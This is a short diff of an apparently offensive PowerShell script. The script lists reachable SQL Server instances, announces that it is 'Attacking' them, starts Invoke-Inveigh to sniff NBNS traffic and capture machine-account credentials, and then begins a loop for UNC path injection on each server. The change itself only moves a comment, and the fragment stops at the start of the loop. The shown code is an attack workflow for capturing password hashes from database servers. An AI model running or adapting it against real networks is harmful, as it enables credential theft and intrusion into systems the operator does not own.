@@ -34,13 +34,14 @@ Write-output "$SQLServerInstancesCount SQL Server instances found"
 $AccessibleSQLServers = $SQLServerInstances | ? {$_.status -eq "Accessible"}
 $AccessibleSQLServersCount = $AccessibleSQLServers.count
 
-# Perform unc path injection on each one
+# Status user
 Write-output "$AccessibleSQLServersCount SQL Server instances can be logged into"
 Write-output "Attacking $AccessibleSQLServersCount accessible SQL Server instances..."
 
 # Start the sniffing
 Invoke-Inveigh -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue | Out-Null 
 
+# Perform unc path injection on each one
 $AccessibleSQLServers | 
 ForEach-Object{
     
